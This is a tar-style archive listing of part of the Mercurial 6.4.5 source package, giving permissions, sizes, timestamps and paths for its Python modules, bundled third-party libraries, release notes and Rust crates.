--rw-r--r--   0 alphare   (1000) alphare   (1000)     4123 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/hglogo.png
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15779 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/mercurial.js
--rw-r--r--   0 alphare   (1000) alphare   (1000)      608 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/style-extra-coal.css
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9074 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/style-gitweb.css
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10635 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/style-monoblue.css
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9313 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/style-paper.css
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2677 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/style.css
--rw-r--r--   0 alphare   (1000) alphare   (1000)    36367 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templateutil.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/testing/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1499 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/testing/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1637 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/testing/revlog.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    47745 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/testing/storage.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/thirdparty/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/__init__.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/thirdparty/attr/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1109 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/LICENSE
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1602 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15137 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/__init__.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4102 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/_cmp.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      357 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/_cmp.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5568 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/_compat.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      826 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/_config.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14645 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/_funcs.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    97569 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/_make.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5882 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/_next_gen.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2121 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/_version_info.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      209 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/_version_info.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3610 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/converters.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      416 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/converters.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1915 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/exceptions.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      539 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/exceptions.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1038 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/filters.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      215 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/filters.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/py.typed
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1400 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/setters.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      573 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/setters.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16793 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/validators.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2355 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/attr/validators.pyi
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/thirdparty/cbor/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1764 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/cbor/.travis.yml
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1130 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/cbor/LICENSE.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1089 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/cbor/README.rst
--rw-r--r--   0 alphare   (1000) alphare   (1000)      141 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/cbor/__init__.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      224 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2603 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/compat.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11722 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/decoder.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13687 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/encoder.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1302 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/types.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/thirdparty/sha1dc/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1270 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/sha1dc/LICENSE.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5786 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/sha1dc/README.md
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6801 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/sha1dc/cext.c
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/thirdparty/sha1dc/lib/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    57725 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/sha1dc/lib/sha1.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4368 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/sha1dc/lib/sha1.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    47913 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/sha1dc/lib/ubc_check.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1844 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/sha1dc/lib/ubc_check.h
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/thirdparty/xdiff/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2316 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xdiff.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29866 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xdiffi.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1683 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xdiffi.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1150 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xinclude.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1901 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xmacros.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13850 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xprepare.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1058 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xprepare.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2730 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xtypes.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3168 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xutils.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1331 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/xdiff/xutils.h
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/thirdparty/zope/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/__init__.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/mercurial/thirdparty/zope/interface/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2070 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/LICENSE.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3101 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1726 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/_compat.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1093 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/_flatten.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    45982 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/_zope_interface_coptimizations.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23342 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/adapter.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7526 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/advice.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/
--rw-r--r--   0 alphare   (1000) alphare   (1000)       61 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20067 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/idatetime.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4272 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/interfaces.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3445 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/mapping.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4698 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/sequence.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30880 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/declarations.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4015 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/document.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2039 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/exceptions.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20297 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/interface.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    43188 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/interfaces.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23084 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/registry.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2045 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/ro.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4688 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/thirdparty/zope/interface/verify.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    33507 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/transaction.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7106 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/treediscovery.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      943 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/txnutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      955 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/typelib.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    84492 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/ui.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10136 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/unionrepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15110 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/upgrade.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/mercurial/upgrade_utils/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/upgrade_utils/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    35686 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/upgrade_utils/actions.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8754 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/upgrade_utils/auto_upgrade.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22594 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/upgrade_utils/engine.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22911 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/url.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3567 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/urllibcompat.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    95590 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/util.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/mercurial/utils/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    37211 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/cborutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25623 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/compression.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11775 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/dateutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      175 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/hashutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1410 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/memorytop.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23010 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/procutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      757 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/repoviewutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3868 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/resourceutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    21551 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/storageutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30373 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/stringutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    31176 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/utils/urlutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23428 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/verify.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27605 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/vfs.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22889 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/win32.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23634 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/windows.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    66136 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/wireprotoframing.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17715 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/wireprotoserver.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13261 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/wireprototypes.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    21923 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/wireprotov1peer.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26916 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/wireprotov1server.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15337 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/worker.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial.egg-info/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1322 2023-06-22 09:18:52.000000 mercurial-6.4.5/mercurial.egg-info/PKG-INFO
--rw-r--r--   0 alphare   (1000) alphare   (1000)    68773 2023-06-22 09:18:52.000000 mercurial-6.4.5/mercurial.egg-info/SOURCES.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)        1 2023-06-22 09:18:52.000000 mercurial-6.4.5/mercurial.egg-info/dependency_links.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)       40 2023-06-22 09:18:52.000000 mercurial-6.4.5/mercurial.egg-info/top_level.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      244 2023-06-22 09:18:26.000000 mercurial-6.4.5/pyproject.toml
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/relnotes/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3757 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/5.1
--rw-r--r--   0 alphare   (1000) alphare   (1000)      897 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/5.2
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1233 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/5.3
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3507 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/5.4
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3504 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/5.5
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1391 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/5.6
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3078 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/5.7
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2742 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/5.8
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3417 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/5.9
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5198 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/6.0
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8465 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/6.1
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4671 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/6.2
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9264 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/6.3
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11390 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/6.4
--rw-r--r--   0 alphare   (1000) alphare   (1000)      295 2023-06-22 09:18:26.000000 mercurial-6.4.5/relnotes/next
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/.cargo/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      399 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/.cargo/config
--rw-r--r--   0 alphare   (1000) alphare   (1000)    36274 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/Cargo.lock
--rw-r--r--   0 alphare   (1000) alphare   (1000)       82 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/Cargo.toml
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4157 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/README.rst
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/chg/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23054 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/Cargo.lock
--rw-r--r--   0 alphare   (1000) alphare   (1000)      474 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/Cargo.toml
--rw-r--r--   0 alphare   (1000) alphare   (1000)      155 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/build.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/chg/src/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2503 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/attachio.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4071 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/clientext.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)      383 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/lib.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15481 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/locator.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2505 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/main.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10104 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/message.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2901 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/procutil.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2487 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/runcommand.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1335 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/sendfds.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3815 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/sighandlers.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2735 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/chg/src/uihandler.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/hg-core/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1200 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/Cargo.toml
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.356352 mercurial-6.4.5/rust/hg-core/examples/
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/hg-core/examples/nodemap/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2437 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/examples/nodemap/index.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4339 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/examples/nodemap/main.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/hg-core/src/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23431 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/ancestors.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4077 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/checkexec.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/hg-core/src/config/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        1 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/config/config.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12029 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/config/layer.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    21307 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/config/mod.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2235 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/config/plain_info.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10001 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/config/values.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/hg-core/src/copy_tracing/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4912 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/copy_tracing/tests.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5272 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/copy_tracing/tests_support.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22992 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/copy_tracing.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9183 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dagops.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/hg-core/src/dirstate/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13187 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate/dirs_multiset.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23661 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate/entry.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4230 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate/parsers.rs
